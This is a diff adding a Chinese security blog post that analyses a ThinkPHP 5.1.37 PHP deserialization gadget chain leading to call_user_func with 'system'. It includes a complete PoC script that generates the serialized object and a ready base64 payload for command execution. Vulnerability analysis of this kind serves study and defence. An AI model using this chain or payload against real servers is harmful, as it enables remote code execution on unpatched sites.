@@ -1,0 +1,252 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>thinkphp5.1.37反序列化漏洞分析 - xiaofeiji&#39;s Blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Xiaofeiji,"> 
+    <meta name="description" content="part 1反序列化起始点为__destruct、__wakeup，因为这两个函数的调用在反序列化过程中都会自动调用。
+因此寻找代码中可用的__destruct函数，找到thinkphp/libra,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="xiaofeiji&#39;s Blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.jpg"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+   <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+   </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="loading">
+    <span id="config-title" style="display:none">xiaofeiji&#39;s Blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">thinkphp5.1.37反序列化漏洞分析</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">thinkphp5.1.37反序列化漏洞分析</h1>
+        <div class="stuff">
+            <span>三月 25, 2022</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-PHP/" rel="tag">代码审计-PHP</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h3 id="part-1"><a href="#part-1" class="headerlink" title="part 1"></a>part 1</h3><p>反序列化起始点为__destruct、__wakeup，因为这两个函数的调用在反序列化过程中都会自动调用。</p>
+<p>因此寻找代码中可用的__destruct函数，找到thinkphp/library/think/process/pipes/Windows.php中的__destruct 方法：</p>
+<p><img src="clipboard.png" alt="img"></p>
+<p>调用removeFiles()方法，</p>
+<p>跟进removeFiles()，发现可以利用file_exit函数触发任意类的__toString()。因为file_exit函数会将变量当做字符串执行：</p>
+<p><img src="clipboard-1648202891837.png" alt="img"></p>
+<p>跟进thinkphp/library/think/.Collection.php中的__toString方法，其调用了toJson方法，而toJson方法中调用了toArray方法:</p>
+<p><img src="clipboard-1648202900348.png" alt="img"></p>
+<p>由于__toString函数的返回结果调用了toArray方法，而toArray中可以触发__call的地方:</p>
+<p>thinkphp/library/think/model/concern/Conversion.php:</p>
+<p><img src="clipboard-1648202913133.png" alt="img"></p>
+<p>这里我们利用到$relation-&gt;visible这个触发点：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">当<span class="variable">$relation</span>不存在的时候，就会进入到<span class="variable">$relation</span>-&gt;visible(<span class="variable">$name</span>)，而<span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getRelation(<span class="variable">$key</span>);     </span><br><span class="line">getRelation()函数:</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getRelation</span>(<span class="params"><span class="variable">$name</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_null(<span class="variable">$name</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;relation[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">让<span class="keyword">$this</span>-&gt;relation为空，则array_key_exists(<span class="variable">$name</span>, <span class="keyword">$this</span>-&gt;relation)条件不成立，返回空。</span><br><span class="line">条件一成立，<span class="variable">$relation</span>为空。</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">进入到下面的<span class="keyword">if</span>语句中：</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$relation</span>) &#123;</span><br><span class="line">        <span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;getAttr(<span class="variable">$key</span>);   <span class="comment">//$relation可控，</span></span><br><span class="line">        <span class="variable">$relation</span>-&gt;visible(<span class="variable">$name</span>);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">跟进getArrt()函数：</span><br><span class="line"> <span class="variable">$value</span>    = <span class="keyword">$this</span>-&gt;getData(<span class="variable">$name</span>);</span><br><span class="line">如果这个<span class="variable">$value</span>值可控，那么下方的<span class="variable">$relation</span>值就可控了。</span><br><span class="line">  </span><br><span class="line">要使这个条件成立，需要跟进getData()函数并且让getAttr() 函数<span class="number">486</span>行下面的<span class="keyword">if</span> 判断条件都不满足。也就是将那些变量都设置为空。</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getData</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">elseif</span>(array_key_exists(<span class="variable">$name</span>,<span class="keyword">$this</span>-&gt;data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">&#125;</span><br><span class="line">  ```````</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">发现这里的<span class="keyword">$this</span>-&gt;data可控，<span class="variable">$name</span>即为传入的<span class="variable">$key</span>，<span class="variable">$key</span> 也就是<span class="keyword">$this</span>-&gt;append 的键名。</span><br><span class="line">因此返回<span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>]，<span class="variable">$relation</span> = <span class="keyword">$this</span>-&gt;data[<span class="variable">$key</span>]，因此<span class="variable">$relation</span>可控。在这里将其设置为一个<span class="keyword">new</span> 对象，调用对象中不存在的visible函数，但是存在__call函数的地方，触发__call函数。</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h3 id="part-2"><a href="#part-2" class="headerlink" title="part 2"></a>part 2</h3><p>因此全文查找一个符合条件的__call函数：</p>
+<p>thinkphp/library/think/Request.php：</p>
+<p><img src="clipboard-1648203047283.png" alt="img"></p>
+<p>在这个方法中，$this-&gt;hook[$method]参数可控，相当于call_user_func_array(array(任意类，任意方法),$args)。</p>
+<p>call_user_func_array()是将$args数组作为参数传入array(任意类，任意方法)函数中使用。</p>
+<p>但是用于前面的array_unshift，会将$this对象插入到$args数组的头部位置，然后$args又作为call_user_func_array的参数调用，这样的话，$this是一个固定的Request类，构造命令执行需要在Request中寻找到合适的方法。</p>
+<p>在Request类中存在input函数：</p>
+<p><img src="clipboard-1648203115905.png" alt="img"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> (is_array(<span class="variable">$data</span>)) &#123;</span><br><span class="line">            array_walk_recursive(<span class="variable">$data</span>, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], <span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br><span class="line">当参数<span class="variable">$data</span>为数组时，将<span class="variable">$data</span>的键值、键名以及<span class="variable">$filter</span>作为函数filterValue的参数传入调用。</span><br></pre></td></tr></table></figure>
+
+<p>跟进查看这个filterValue过滤器函数：</p>
+<p><img src="clipboard-1648203139414.png" alt="img"></p>
+<p>call_user_func($filter, $value); </p>
+<p>直接进行call_user_func的命令执行。</p>
+<p>因此如果能调用input方法，就能成功构造payload导致命令执行。</p>
+<p>但是如果直接调用input方法，传入的$name的类型为数组回和input函数中对$name强制转化为字符串的类型冲突，导致程序异常退出。</p>
+<p>toArrray()中要求传入的$name是数组的形式：</p>
+<p><img src="clipboard-1648203193967.png" alt="img"></p>
+<p>而在input函数中会强制转化为string类型：</p>
+<p><img src="clipboard-1648203207015.png" alt="img"></p>
+<p>因此寻找调用input函数的方法，找到param()方法，但是param方法的第一个参数都为$name变量，传入后同样造成类型冲突。</p>
+<p>再寻找param()被调用的地方试试，在Request类中有一个isAjax方法，调用了param函数，且被调用的param函数中第一个值$this-&gt;config[‘var_ajax’]可控，将其构造成字符串的形式，就能符合input函数中对于$name的类型判断。</p>
+<p><img src="clipboard-1648203217709.png" alt="img"></p>
+<p>在这里跟进param()方法：</p>
+<p><img src="clipboard-1648203225971.png" alt="img"></p>
+<p>$name经过method函数和method函数调用的server函数处理后，返回的是字符串false字段;满足调用input方法时string类型的转化问题。</p>
+<p>$this-&gt;param字段值由get方法传入获取，可以在payload中直接设定该参数的值，因为最后的利用采用的是get传参方式，可以获取到该值。将该值设置为数组，即可满足传入input中$data为数组的要求。</p>
+<p>其中$filter参数由$filter = $this-&gt;getFilter($filter, $default);中$this-&gt;filter获取。</p>
+<p><img src="clipboard-1648203238634.png" alt="img"></p>
+<p>因此：</p>
+<p>传入的$this-&gt;param构造成数组的形式，$name返回的是false字段满足input函数中的string类型转化；$filter由input函数中获取：</p>
+<p><img src="clipboard-1648203247188.png" alt="img"></p>
+<p>进入input函数，触发filterValue函数，执行call_user_func()，造成命令执行。</p>
+<h3 id="part-3"><a href="#part-3" class="headerlink" title="part 3"></a>part 3</h3><p>整理一下思路：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一开始是通过Windows.php中的__destruct 方法调用removeFiles()，其中的file_exist触发toString方法，toString调用了toJson返回值调用了toArray，其中toArray存在__call函数调用的触发点；</span><br><span class="line"></span><br><span class="line">我们选择了  $relation-&gt;visible($name);调用某个特定类中不存在的visible方法从而触发其中的__call方法，__call方法中由于$this的限定，我们找到了thinkphp中常用触发点input方法，因为其相当于直接的命令执行：call_user_func($filter, $value)；</span><br><span class="line"></span><br><span class="line">但是这里需要进行间接地调用input函数，因此开始寻找调用了该方法的方法，找到param，再找到了调用param的isAjax方法，在这里可以构造param()方法的第一个值使其满足类型要求：isAjax()-&gt;param()-&gt;input()-&gt;call_user_func($filter, $value)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>因此：</p>
+<p>只需要让Request 对象中的 $this-&gt;filter=’system’ 且 isAjax调用的param中的$this-&gt;param=array(‘id’) 即可。其相当于最终命令执行中的参数$filter以及$value。（$this-&gt;param构造成数组的形式是为了满足input函数的要求）</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">最终的payload：</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>;</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;ethan&quot;</span>=&gt;[<span class="string">&quot;dir&quot;</span>]];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;ethan&quot;</span>=&gt;<span class="keyword">new</span> Request()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Request</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hook</span> = [];</span><br><span class="line">    <span class="comment">//protected $param = [&#x27;dir&#x27;];</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filter</span> = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$config</span> = [</span><br><span class="line">        <span class="comment">// 表单请求类型伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_method&#x27;</span>       =&gt; <span class="string">&#x27;_method&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单ajax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_ajax&#x27;</span>         =&gt; <span class="string">&#x27;_ajax&#x27;</span>,</span><br><span class="line">        <span class="comment">// 表单pjax伪装变量</span></span><br><span class="line">        <span class="string">&#x27;var_pjax&#x27;</span>         =&gt; <span class="string">&#x27;_pjax&#x27;</span>,</span><br><span class="line">        <span class="comment">// PATHINFO变量名 用于兼容模式</span></span><br><span class="line">        <span class="string">&#x27;var_pathinfo&#x27;</span>     =&gt; <span class="string">&#x27;s&#x27;</span>,</span><br><span class="line">        <span class="comment">// 兼容PATH_INFO获取</span></span><br><span class="line">        <span class="string">&#x27;pathinfo_fetch&#x27;</span>   =&gt; [<span class="string">&#x27;ORIG_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_PATH_INFO&#x27;</span>, <span class="string">&#x27;REDIRECT_URL&#x27;</span>],</span><br><span class="line">        <span class="comment">// 默认全局过滤方法 用逗号分隔多个</span></span><br><span class="line">        <span class="string">&#x27;default_filter&#x27;</span>   =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// 域名根，如thinkphp.cn</span></span><br><span class="line">        <span class="string">&#x27;url_domain_root&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// HTTPS代理标识</span></span><br><span class="line">        <span class="string">&#x27;https_agent_name&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="comment">// IP代理获取标识</span></span><br><span class="line">        <span class="string">&#x27;http_agent_ip&#x27;</span>    =&gt; <span class="string">&#x27;HTTP_X_REAL_IP&#x27;</span>,</span><br><span class="line">        <span class="comment">// URL伪静态后缀</span></span><br><span class="line">        <span class="string">&#x27;url_html_suffix&#x27;</span>  =&gt; <span class="string">&#x27;html&#x27;</span>,</span><br><span class="line">    ];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filter = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;config = [<span class="string">&quot;var_ajax&quot;</span>=&gt;<span class="string">&#x27;&#x27;</span>];  <span class="comment">//不能赋值，在传入method方法和server方法判断时，会返回false，满足input中对$name为字符串的类型判断。</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;hook = [<span class="string">&quot;visible&quot;</span>=&gt;[<span class="keyword">$this</span>,<span class="string">&quot;isAjax&quot;</span>]];   <span class="comment">//调用该类中不存在的visible方法，触发__call函数，调用本类中的isAjax函数，传入参数filer</span></span><br><span class="line">       <span class="comment">// $this-&gt;param = [&#x27;dir&#x27;];</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">concern</span>\<span class="title">Conversion</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;   <span class="comment">//因为Model是一个抽象类，不能直接实例化对象，因此调用其子类Pivot</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>\<span class="title">Windows</span>;</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Windows()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在index.php主页中增加反序列化触发的代码：</p>
+<p><img src="clipboard-1648203324364.png" alt="img"></p>
+<p>传入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToxOntpOjA7czozOiJkaXIiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo4O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&amp;xiao=dir</span><br></pre></td></tr></table></figure>
+
+<p><img src="clipboard-1648203344428.png" alt="img"></p>
+<p>直接在后面加上xiao=dir或者是在poc中写入$this-&gt;param都可。</p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41891666/article/details/107463740">https://blog.csdn.net/qq_41891666/article/details/107463740</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable=''
+        data-ae=''
+        data-ci=''
+        data-cs=''
+        data-r='xiaofeiji-77.github.io'
+        data-o='xiaofeiji-77'
+        data-a='xiaofeiji-77'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#part-1"><span class="toc-number">1.</span> <span class="toc-text">part 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part-2"><span class="toc-number">2.</span> <span class="toc-text">part 2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#part-3"><span class="toc-number">3.</span> <span class="toc-text">part 3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">4.</span> <span class="toc-text">poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">5.</span> <span class="toc-text">参考文章</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+   
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/click_show_text.js"></script>
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<script src="https://cdn.jsdelivr.net/gh/wallleap/cdn/js/canvas-nest.min.js"></script>
+</html>
